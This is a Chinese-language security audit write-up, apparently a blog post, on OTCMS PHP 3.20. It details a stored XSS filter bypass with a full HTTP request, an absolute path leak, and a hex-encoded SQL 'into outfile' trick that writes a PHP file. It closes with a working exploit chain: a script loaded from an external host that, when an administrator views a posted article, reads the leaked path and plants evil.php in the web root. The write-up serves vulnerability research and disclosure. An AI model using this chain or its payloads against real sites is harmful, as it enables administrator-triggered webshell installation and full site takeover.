@@ -1,0 +1,236 @@
+**0x00 背景**
+
+本周拿到OTCMS的源码便对该源码进行审计，发现这个源码使用了预编译暂时没有找到SQL注入相关的问题，且对用户输入的内容控制比较严格，对大部分的用户输入位置进行数据类型的转换，引号的转义等安全处理，最后通过审计发现了如下的安全问题组合利用可以GetShell，虽然GetShell的条件限制可能较多。期待和师傅的各种交流讨论，共同学习。
+
+ **0x01 审计过程**
+
+ **XSS注入**
+
+ **0x00 相关环境**
+
+源码信息：OTCMS-PHP-3.20-20180316
+
+问题文件： \otcms\OTCMS_PHP_3.20_20180316\inc\classArea.php
+
+漏洞类型：存储型XSS注入
+
+站点地址：<http://otcms.com/>
+
+ **0x01 漏洞分析**
+
+首先注册会员并在管理员审核通过后在会员中心发布文章，在\otcms\OTCMS_PHP_3.20_20180316\usersNews_deal.php文件的第58行中接收POST请求的content参数的值然后传入到FilterEditor方法中进行安全处理。
+
+![处理.png](https://image.3001.net/images/20180419/15241180732041.png!small)
+
+跟入FilterEditor方法，在\otcms\OTCMS_PHP_3.20_20180316\inc\classArea.php文件的第247行中发现该方法。通过分析该方法的过滤规则，得知过滤规则可以被绕过。
+
+![绕过.png](https://image.3001.net/images/20180419/15241180948030.png!small)
+
+过滤规则存在被绕过的的问题，绕过的方式有多种，这里我是绕过script标签，绕过的方式很简单，仅需在最后一个的>位置之前加上空格即可。
+
+    
+    
+    $str = preg_replace("/<\s*(script[^>]*)>([\s\S][^<]*)<\/\s*script>/si","",$str);
+    
+    $str = preg_replace("/<\s*(script[^>]*)><\/\s*script>/si","",$str);
+    
+
+![tr.png](https://image.3001.net/images/20180419/15241181185355.png!small)
+
+  
+
+**0x02 漏洞复现**
+
+进行如下请求可以在发布的文章正文中进行存储XSS的利用。
+
+    
+    
+    POST /usersNews_deal.php?mudi=deal HTTP/1.1
+    
+    Host: 127.0.0.1:8083
+    
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+    
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    
+    Accept-Language: en-US,en;q=0.5
+    
+    Accept-Encoding: gzip, deflate
+    
+    Referer: [http://127.0.0.1:8083/usersCenter.php?mudi=addNews](http://127.0.0.1:8083/usersCenter.php?mudi=addNews)
+    
+    Content-Type: application/x-www-form-urlencoded
+    
+    Content-Length: 528
+    
+    Cookie: VGM_msid=lK6h9L; uc_menu=7; VGM_userauth=iCWfvAR8iseJ5T3P9bVHw%2BZLTvqmLhL8vMS0IIj3ZoEOL2%2Fa%2Fax8vtdH; Azt_msid=jzN649; P4i_msid=543XR7; QF5_msid=YsrpNW; QF5_userauth=0RDHaeNxlXszVUhosa8jfPnOOjqv3NTLBStfYowagRk6AfRaUUZijnnS; menubox1=menubox1; PHPSESSID=tfj0laduj9m85taajh7f5esrp2; SWAwc_userID=1; SWAwc_username=thinking; SWAwc_userInfo=UzZdCAVyW2BXal1jVDtQbgQ9UWULWVxnB2IEOlA4VjQBMA9iA2VVMwdgAWlTZlcwBmQANw5iXDEBbF42WjsAMlMwXTkFMFtsVzBdOFRpUD8Ea1FhC2VcXAdbBFJQNVYpAWAPLwMz;XDEBUG_SESSION=PHPSTORM
+    
+    Connection: close
+    
+    Upgrade-Insecure-Requests: 1
+    
+    backURL=http%3A%2F%2F127.0.0.1%3A8083%2FusersCenter.php%3Fmudi%3DaddNews&dataID=0&isScore1=1&isScore2=1&isScore3=0&score1Name=%E7%BB%8F%E9%AA%8C%E5%80%BC&score2Name=%E7%BD%91%E9%92%9B%E5%B8%81&score3Name=&infoScore1=10&infoScore2=10&infoScore3=10&theme=Thinking_test&source=%E7%BD%91%E9%92%9B%E7%A7%91%E6%8A%80&writer=thinking&typeStr=%2C12%2C&content=<script>alert(1)</script >&infoFileDir=upFiles%2FinfoImg%2F&upImgStr=&pageNum=&themeKey=&contentKey=&img=&isCheckUser=0&score1=&score2=&score3=&cutScore1=&cutScore2=&cutScore3=
+    
+
+![3  1.png](https://image.3001.net/images/20180419/15241182501959.png!small)
+
+![3  2.png](https://image.3001.net/images/20180419/15241182645878.png!small)
+
+接下来访问新闻资讯(发布文章时候选择的栏目)中发布的文章便会触发XSS。
+
+![xss.png](https://image.3001.net/images/20180419/15241182957113.png!small)
+
+  
+
+ **绝对路径泄露**
+
+ **0x00 相关环境**
+
+源码信息：OTCMS-PHP-3.20-20180316
+
+问题文件：\otcms\OTCMS_PHP_3.20_20180316\inc\classZip.php
+
+漏洞类型：绝对路径泄露
+
+站点地址：<http://otcms.com/>
+
+ **0x01 漏洞分析**
+
+在文件\otcms\OTCMS_PHP_3.20_20180316\inc\classZip.php中的第86行中,在进行备份文件的压缩的时候，将压缩的路径直接打印出来，暴露了站点的绝对路径。
+
+![lujing.png](https://image.3001.net/images/20180419/15241183577529.png!small)
+
+**0x02 漏洞复现**
+
+进行如下请求可以获取站点的绝对路径。
+
+![路径 1.png](https://image.3001.net/images/20180419/152411841822.png!small)
+
+![路径 2.png](https://image.3001.net/images/20180419/15241184326874.png!small)
+
+  
+
+**数据库写马**
+
+ **0x00 相关环境**
+
+源码信息：OTCMS-PHP-3.20-20180316
+
+问题文件： \otcms\OTCMS_PHP_3.20_20180316\admin\sysCheckFile_deal.php
+
+漏洞类型：数据库写马
+
+站点地址：<http://otcms.com/>
+
+ **0x01 漏洞分析**
+
+由于该源码暴露了站点的绝对路径，所以就开始挖掘SQL注入漏洞，后面发现站点使用了预编译所以暂时还没有找到可以利用的点，在后台的“管理员专区->程序文件检查->SQL语句调试”中发现可以执行SQL语句的地方，通过分析文件\otcms\OTCMS_PHP_3.20_20180316\admin\sysCheckFile_deal.php文件中的第541行中内容，得知在执行SQL语句中是不能出现分号的，但是通过数据库写马操作写入PHP代码是有分号的，此处可以使用hex编码绕过。
+
+![编码.png](https://image.3001.net/images/20180419/15241185086647.png!small)
+
+**0x02 漏洞复现**
+
+进行如下请求将PHP代码进行hex编码后再执行数据库写马操作便可以getshell。
+
+![s  1.png](https://image.3001.net/images/20180419/15241185631876.png!small)
+
+![s  2.png](https://image.3001.net/images/20180419/15241185814931.png!small)
+
+  
+
+**漏洞的组合利用**
+
+首先需要在前台存储型xss中引入js文件，<http://xx.xx.xx/97b575.js>，js的内容如下所示。
+
+    
+    
+    function loadXMLDoc()
+    
+    {
+    
+    var xmlhttp;
+    
+    if (window.XMLHttpRequest)
+    
+      {// code for IE7+, Firefox, Chrome, Opera, Safari
+    
+      xmlhttp1=new XMLHttpRequest();
+    
+      xmlhttp2=new XMLHttpRequest();
+    
+      }
+    
+    else
+    
+      {// code for IE6, IE5
+    
+      xmlhttp1=new ActiveXObject("Microsoft.XMLHTTP");
+    
+      xmlhttp2=new ActiveXObject("Microsoft.XMLHTTP");
+    
+      }
+    
+    xmlhttp1.onreadystatechange=function()
+    
+      {
+    
+      if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
+    
+        {
+    
+        filepath=xmlhttp1.responseText;
+    
+        reg="<div>1/1正在压缩文件(.*?)</div>"
+    
+        data = filepath.match(reg);
+    
+        data = data[1].replace(/\//g,"\/\/");
+    
+        data = data.replace(/ /g,"")}
+    
+        xmlhttp2.open("POST","[http://127.0.0.1:8083/admin/sysCheckFile_deal.php?mudi=sql](http://127.0.0.1:8083/admin/sysCheckFile_deal.php?mudi=sql)",true);
+    
+        xmlhttp2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    
+        xmlhttp2.send("backURL=[http://127.0.0.1:8083/admin/sysCheckFile.php?mudi=sql&sqlContent=select](http://127.0.0.1:8083/admin/sysCheckFile.php?mudi=sql&sqlContent=select) 0x3c3f70687020706870696e666f28293b3f3e into outfile \""+data+"//evil.php\"");
+    
+      }
+    
+    xmlhttp1.open("POST","[http://127.0.0.1:8083/admin/softBak_deal.php?mudi=backup](http://127.0.0.1:8083/admin/softBak_deal.php?mudi=backup)",true);
+    
+    xmlhttp1.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    
+    xmlhttp1.send("backURL=http%3A%2F%2F127.0.0.1%3A8083%2Fadmin%2FsoftBak.php%3Fmudi%3Dbackup&mode=diy&selTable%5B%5D=upFile&zipNote=&backupSpace=server");
+    
+    }
+    
+    loadXMLDoc();
+    
+
+在会员中心中进行文章的发布。然后正常填入文章内容选项，提交的时候使用burp suite进行代理抓包，添加<script
+src="http://xx.xx.xx/97b575.js" </script >然后提交请求包。
+
+![请求包.png](https://image.3001.net/images/20180419/15241192044607.png!small)  
+
+模拟管理员登录后台，并查看或审核文章，当管理员访问到该文章，便会触发JS从而为利用数据库写马的操作，写入PHP文件GetShell.
+
+管理员查看文章，便会触发ajax进行XHR请求，写入PHP文件。
+
+![文  1.png](https://image.3001.net/images/20180419/15241193008464.png!small)  
+
+![文  2.png](https://image.3001.net/images/20180419/1524119319524.png!small)  
+
+此时在D:\soft\phpStudy\PHPTutorial\WWW\code\otcms\OTCMS_PHP_3.20_20180316\upFiles文件夹下便会生成一个evil.php的文件。  
+
+![生成.png](https://image.3001.net/images/20180419/1524119382659.png!small)  
+
+访问该文件便能执行PHP代码GetShell。  
+
+![访问.png](https://image.3001.net/images/20180419/15241194378750.png!small)  
+
+ **0x02 小结**
+
+本篇以otcms的源码进行审计，其中数据库写马的操作限制比较多，但是通过这几个漏洞的组合利用，可以学习下使用前端代码获取ajax返回的绝对路径并进行数据库写马操作，期待师傅们一起交流讨论，但是如果是hc请走开勿扰，交流学习可联系我thinking_balabala@163.com。
+
+![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180419/15241194807342.jpg!small)  
+
